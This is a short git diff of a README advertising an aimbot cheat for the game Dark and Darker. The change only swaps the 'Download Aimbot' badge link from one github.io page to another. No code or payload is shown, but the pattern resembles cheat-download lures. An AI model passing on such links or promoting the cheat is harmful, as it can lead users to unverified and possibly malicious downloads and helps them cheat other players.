@@ -4,7 +4,7 @@ Tired of whiffing your Ranger arrows or missing those clutch Wizard fireballs? I
 
 Whether you’re solo queueing or running with a team, this cheat will transform you from shaky shots to PvP legend ⚔️🔥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Dark-and-Darker-Aimbot-bidyh.github.io/.github)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://becksparco.github.io/)
 ---
 
 ## 🧠 What Does the Aimbot Do?
